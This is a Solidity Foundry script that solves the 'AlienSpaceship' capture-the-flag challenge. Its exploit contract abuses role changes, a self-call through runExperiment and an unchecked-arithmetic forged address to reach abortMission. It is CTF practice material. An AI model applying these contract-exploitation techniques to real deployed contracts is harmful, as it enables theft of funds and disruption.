// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// import "forge-ctf/CTFSolver.sol";
import "src/AlienSpaceship.sol";
import {Challenge} from "src/Challenge.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;
    AlienSpaceship public alienSpaceship;
    ExtraAccount public extraAccount;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;

        alienSpaceship = AlienSpaceship(address(CHALLENGE.ALIENSPACESHIP()));
        extraAccount = new ExtraAccount(address(alienSpaceship));
        console.logAddress(address(extraAccount));

        alienSpaceship.applyForJob(alienSpaceship.ENGINEER());
        uint256 amountToDump = alienSpaceship.payloadMass() - 500e18 - 1;
        console.log("a-1: ",alienSpaceship.payloadMass());
        alienSpaceship.dumpPayload(amountToDump);
        console.log("a-2: ",alienSpaceship.payloadMass());
        alienSpaceship.runExperiment(abi.encodeWithSignature("applyForJob(bytes32)", alienSpaceship.ENGINEER()));
        alienSpaceship.quitJob();
        alienSpaceship.applyForJob(alienSpaceship.PHYSICIST());
        alienSpaceship.enableWormholes();
    }

    function exploit() external {
        alienSpaceship.applyForPromotion(alienSpaceship.CAPTAIN());
        uint160 _secret;
        unchecked {
            _secret = uint160(51) - uint160(address(this));
        }
        alienSpaceship.visitArea51(address(_secret));
        console.log("b-1: ",alienSpaceship.payloadMass());
        alienSpaceship.jumpThroughWormhole(100_000e18, 100_000e18, 100_000e18);
        console.log("b-2: ",alienSpaceship.payloadMass());
        extraAccount.applyForJob();
        extraAccount.dumpPayload();
        alienSpaceship.abortMission();
    }

    function empty() external {}
}

contract ExtraAccount {
    AlienSpaceship public alienSpaceship;

    constructor(address _alienSpaceship) {
        alienSpaceship = AlienSpaceship(_alienSpaceship);
    }

    function applyForJob() external {
        alienSpaceship.applyForJob(alienSpaceship.ENGINEER());
    }
    function dumpPayload() external {
        console.log("c-1: ",alienSpaceship.payloadMass());
        uint256 amountToDump = alienSpaceship.payloadMass() - 500e18 - 1e18;
        alienSpaceship.dumpPayload(amountToDump);
        console.log("c-2: ",alienSpaceship.payloadMass());
    }
}

contract Solve is Script {
    function run() public {
        vm.startBroadcast();
        AlienSpaceship alienSpaceship = new AlienSpaceship();
        Challenge challenge = new Challenge(address(alienSpaceship));
        Exploit exploit = new Exploit(challenge);
        //////////////////////////////////////////////
        console.log(block.number);
        vm.roll(block.number + 20);
        vm.warp(20);
        console.log(block.number);
        //////////////////////////////////////////////
        exploit.exploit();
        console.log("solved?", challenge.isSolved());
        vm.stopBroadcast();
    }
}
